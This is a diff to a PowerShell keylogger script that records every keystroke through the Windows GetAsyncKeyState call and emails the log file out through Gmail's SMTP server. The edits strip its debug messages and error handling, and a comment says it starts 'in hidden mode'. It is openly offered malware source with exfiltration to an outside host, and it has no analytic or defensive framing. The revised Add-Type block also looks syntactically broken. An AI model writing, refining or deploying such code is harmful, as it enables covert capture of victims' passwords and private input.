@@ -8,8 +8,6 @@ $killSwitchTriggered = $false  # Flag to track if kill switch has been triggered
 function Send-Email {
     param($logFilePath)
     
-    Write-Host "Sending email..."  # Debug message
-    
     # Define SMTP server and credentials (use Gmail in this case)
     $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587)
     $SMTPInfo.EnableSsl = $true
@@ -22,27 +20,20 @@ function Send-Email {
     $ReportEmail.Body = "Attached is the keylog data."
     $ReportEmail.Attachments.Add($logFilePath)
     
-    try {
-        # Send email
-        $SMTPInfo.Send($ReportEmail)
-        Write-Host "Email sent successfully!"  # Debug message
-    } catch {
-        Write-Host "Failed to send email: $_"  # Debug message in case of failure
-    }
+    # Send email
+    $SMTPInfo.Send($ReportEmail)
 }
 
 # Run keylogger loop
 function Start-KeyLogger {
-    # Fix Add-Type with proper C# syntax (no space before closing @")
-    Add-Type -TypeDefinition @'
-using System;
-using System.Runtime.InteropServices;
-
-public class KeyLogger {
-    [DllImport("user32.dll", SetLastError = true)]
-    public static extern short GetAsyncKeyState(int vKey);
-}
-'@ -Language CSharp
+    Add-Type -TypeDefinition @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class KeyLogger {
+        [DllImport("user32.dll")]
+        public static extern short GetAsyncKeyState(int vKey);
+    }
+    "@ -Name "KeyLogger" -Namespace "KeyLogging" -Using System.Text;
 
     $startTime = Get-Date
     $lastSent = $startTime
@@ -51,7 +42,7 @@ public class KeyLogger {
     while ($true) {
         # Capture key presses
         for ($i = 1; $i -lt 255; $i++) {
-            if ([KeyLogger]::GetAsyncKeyState($i) -ne 0) {
+            if ([KeyLogging.KeyLogger]::GetAsyncKeyState($i) -ne 0) {
                 $keyPresses += [char]$i
             }
         }
@@ -75,7 +66,6 @@ public class KeyLogger {
             Send-Email -logFilePath $logFile
             Remove-Item $logFile -Force
             Remove-Item "$env:TEMP\killSwitch.txt" -Force  # Remove any potential leftover killSwitch file
-            Write-Host "Kill switch triggered, exiting..."  # Debug message
             Exit
         }
 
@@ -85,5 +75,4 @@ public class KeyLogger {
 }
 
 # Start the keylogger in hidden mode
-Write-Host "Starting keylogger..."  # Debug message
 Start-KeyLogger
